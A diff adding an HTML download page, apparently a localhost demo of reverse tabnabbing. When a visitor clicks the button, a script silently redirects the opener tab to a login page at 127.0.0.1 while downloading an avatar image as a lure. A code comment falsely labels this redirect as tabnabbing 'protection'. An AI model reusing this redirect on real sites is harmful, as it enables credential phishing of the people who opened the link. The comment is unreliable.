@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Download Page</title>
+    <style>
+        body {
+            margin: 0;
+            background: url('download.png') center/cover no-repeat fixed;
+            color: #fff;
+            font-family: 'Arial', sans-serif;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .download-container {
+            position: absolute;
+            z-index: 2;
+            text-align: center;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 40px;
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(0, 255, 0, 0.2);
+        }
+
+        .download-text {
+            font-size: 48px;
+            margin-bottom: 30px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            text-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
+            position: relative;
+        }
+
+        .download-btn {
+            padding: 20px 40px;
+            font-size: 24px;
+            background: rgba(0, 255, 0, 0.2);
+            color: #0F0;
+            border: 2px solid #0F0;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
+        }
+
+        .download-btn:hover {
+            background: rgba(0, 255, 0, 0.3);
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.5);
+            transform: scale(1.05);
+        }
+    </style>
+</head>
+<body>
+    <canvas id="matrixCanvas"></canvas>
+    <div class="download-container">
+        <div class="download-text">Download Now</div>
+        <button class="download-btn" onclick="startDownload()">Download</button>
+    </div>
+    <script src="matrix.js"></script>
+    <script>
+        function startDownload() {
+            // Reverse tabnabbing protection
+            if (window.opener) {
+                window.opener.location = "http://127.0.0.1:5500/login.html";
+            }
+
+            // Create temporary link and trigger download
+            const link = document.createElement("a");
+            link.href = "https://avatars.githubusercontent.com/u/150169239?v=4";
+            link.download = "avatar.jpg";
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+    </script>
+</body>
+</html>
